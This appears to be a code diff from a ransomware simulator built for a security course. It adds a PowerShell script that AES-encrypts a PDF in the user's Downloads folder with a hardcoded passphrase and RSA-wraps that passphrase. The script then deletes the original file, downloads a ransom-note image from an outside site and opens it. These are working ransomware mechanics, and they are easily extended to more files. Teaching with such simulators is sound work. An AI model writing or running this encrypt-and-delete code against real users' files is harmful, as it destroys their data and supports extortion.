@@ -164,7 +164,66 @@ open ${ransomNoteOutput}`
     windowsCommands: {
       checkCommand: 'powershell -NoProfile -Command "$PSVersionTable.PSVersion"',
       protectCommands: [
-        `cipher /E "$env:USERPROFILE\\Downloads\\${COURSE_OUTLINE_FILE}"; Invoke-WebRequest -Uri "https://ransomware-simulator-self.vercel.app/RANSOMNOTE.png" -OutFile "$env:USERPROFILE\\Downloads\\RANSOMNOTE.png"; Start-Process "$env:USERPROFILE\\Downloads\\RANSOMNOTE.png"`
+        `$downloads = Join-Path $HOME "Downloads"
+$pdf = Join-Path $downloads "${COURSE_OUTLINE_FILE}"
+$pdfEnc = Join-Path $downloads "${COURSE_OUTLINE_FILE}.enc"
+$keyEnc = Join-Path $downloads "${COURSE_OUTLINE_FILE}.key.enc"
+$privKey = Join-Path $downloads "privatekey(given_after_ransom).pem"
+$pubKey = Join-Path $downloads "public.pem"
+$note = Join-Path $downloads "RANSOMNOTE.png"
+$pass = 'ProfPleaseGiveUsA+'
+# Create dummy input PDF if it does not exist
+if (-not (Test-Path $pdf)) {
+Set-Content -Path $pdf -Value "Sample PDF Content for IS613 Course Outline"
+Write-Host "Created missing input file: $pdf" -ForegroundColor Yellow
+}
+try {
+# 1. RSA 2048-bit Key Pair Generation
+$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider(2048)
+
+$privBlob = $rsa.ExportCspBlob($true)
+$privBase64 = [Convert]::ToBase64String($privBlob, [System.Base64FormattingOptions]::InsertLineBreaks)
+$privPem = "-----BEGIN RSA PRIVATE KEY-----" + [Environment]::NewLine + $privBase64 + [Environment]::NewLine + "-----END RSA PRIVATE KEY-----"
+[System.IO.File]::WriteAllText($privKey, $privPem)
+$pubBlob = $rsa.ExportCspBlob($false)
+$pubBase64 = [Convert]::ToBase64String($pubBlob, [System.Base64FormattingOptions]::InsertLineBreaks)
+$pubPem = "-----BEGIN RSA PUBLIC KEY-----" + [Environment]::NewLine + $pubBase64 + [Environment]::NewLine + "-----END RSA PUBLIC KEY-----"
+[System.IO.File]::WriteAllText($pubKey, $pubPem)
+# 2. AES-256-CBC File Encryption (PBKDF2 Salted)
+$salt = New-Object byte[] 8
+[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
+
+$kdf = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($pass, $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA1)
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $kdf.GetBytes(32)
+$aes.IV = $kdf.GetBytes(16)
+$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$pdfBytes = [System.IO.File]::ReadAllBytes($pdf)
+$encBytes = $aes.CreateEncryptor().TransformFinalBlock($pdfBytes, 0, $pdfBytes.Length)
+
+# OpenSSL "Salted__" header + salt + ciphertext compatibility
+$header = [System.Text.Encoding]::ASCII.GetBytes("Salted__")
+$payload = $header + $salt + $encBytes
+[System.IO.File]::WriteAllBytes($pdfEnc, $payload)
+# 3. Encrypt Passphrase with RSA Public Key
+$passBytes = [System.Text.Encoding]::UTF8.GetBytes($pass)
+$encPass = $rsa.Encrypt($passBytes, [System.Security.Cryptography.RSAEncryptionPadding]::Pkcs1)
+[System.IO.File]::WriteAllBytes($keyEnc, $encPass)
+# 4. Verify Output Files
+if ((Test-Path $pdfEnc) -and ((Get-Item $pdfEnc).Length -gt 0) -and (Test-Path $keyEnc) -and ((Get-Item $keyEnc).Length -gt 0)) {
+Remove-Item -Path $pdf, $pubKey -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri 'https://ransomware-simulator-self.vercel.app/RANSOMNOTE.png' -OutFile $note
+Start-Process $note
+Write-Host "Encryption finished successfully." -ForegroundColor Green
+} else {
+throw "Output file verification failed."
+}
+} catch {
+Remove-Item -Path $pdfEnc, $keyEnc -ErrorAction SilentlyContinue
+Write-Host "ENCRYPTION FAILED: $_" -ForegroundColor Red
+}
+Read-Host -Prompt "Press Enter to exit..."`
       ]
     }
   };
